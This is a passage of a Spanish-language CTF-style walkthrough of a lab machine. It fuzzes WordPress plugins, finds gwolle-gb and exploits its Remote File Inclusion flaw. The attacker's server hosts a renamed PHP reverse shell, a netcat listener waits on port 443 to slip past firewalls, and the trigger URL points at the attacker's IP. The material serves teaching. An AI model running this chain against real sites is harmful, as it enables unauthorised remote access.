+veremos que no muestra nada, pero existe, ya que si no existiera nos pondría un Not Found. Entonces lo que podemos hacer es hacer uso de un diccionario de plugins para
+wordpress. Para ello vamos a utilizar una herramienta llamda SecLists que son un repositorio centralizado de diccionarios utilizados en el ambito del pentesting.
+En concreto, nos interesa uno llamado wp-plugins.fuzz.txt que contiene muchos nombres de scripts y aplicando fuzzing podremos averiguar si existen en la página víctima
+o no (dependiendo de si nos devuelve un 200 OK).
+-wfuzz -c -L -t 400 --hc=404 -w wp-plugins.fuzz.txt https://10.10.10.88/webservices/wp/FUZZ -> Nos encuentra un plugin llamado "wp-content/plugins/gwolle-gb/", el cual
+si buscamos por https://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/ vemos que si existe y es vulnerable.
+Aquí es cuando viene la FASE DE EXPLOTACIÓN DE VULNERABILIDADES:
+-searchsploit gwolle -> Utilizando la herramienta Searchsploit y buscando por el nombre del plugin, nos mostrará si existe algun exploit. En este caso nos aparece un
+exploit de tipo Remote File Inclusion (RFI). Esto es cuando desde otra máquina (una tercera) somos capaces de apuntar, desde ciertos parametros de la url, a archivos
+de terceros. Entonces, si creamos un scripts php malicioso, que me ejecute tareas por detras que injecte yo por comandos, y desde esa máquina podemos apuntar hacia
+nuestro archivo desde el servidor web, esa máquina va a ejecutar e interpretar mis acciones. Podiendo lanzar por ejemplo una shell a nuestra máquina atacante.
+-searchsploit -x php/webapps/38861.txt -> Parámetro -x para inspeccionar el codigo del exploit. En este caso, es un archivo .txt que nos muestra paso a paso lo que
+tenemos que hacer para vulnerar el sitio web. 
+Lo que tenemos que hacer es irnos a la ruta https://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<servidor
+web que nosotros vamos a estar alojando>. En ese servidor tendremos que tener el archivo wp-load.php, el cual podemos conseguir por internet (no hace falta que sepamos
+php para este caso), por ejemplo en pentestmonkey.net podemos descargar el comprimido php-reverse-shell.php que ejecutará las instrucciones necesarias para enviarnos
+una shell. Modificamos el archivo para indicarle nuestra dirección IP y por el puerto que nos vamos a poner en escucha (por donde nos hará llegar la shell). Una buena
+práctica es poner el puero 443 (https), ya que muchas veces pasa desapercibido entre los firewalls como si fuera tráfico de navegación web.
+mv php-reverse-shell.php wp-load.php -> Le cambiamos el nombre, ya que el exploit nos dijo que el archivo se tenia que llamar wp-load.php.
+Ahora esto lo tenemos que comparir a través de un servidor web:
+-python -m SimpleHTTPServer 80 -> Con el parametro -m le indicamos un modulo de python "SimpleHTTPServer" para compartir el directorio actual a través del puerto
+indicado. Si nos vamos al localhost veremos como si lo esta compartiendo.
+-nc -nlvp 443 -> Primeramente, nos ponemos en escucha por el puerto 443.
+Seguidamente, lo unico que tenemos que hacer para que el exploit lance la reverse-shell es ir a la ruta https://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
+frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.18 (nuestra dirección IP). De esta forma ganaríamos el acceso remoto a la máquina victima, eso si, desde un
+usuario no privilegiado (www-data). Por el momento, vemos que la shell no es del todo manejable por lo que hay que efectuar un tratamiento de la TTY. 
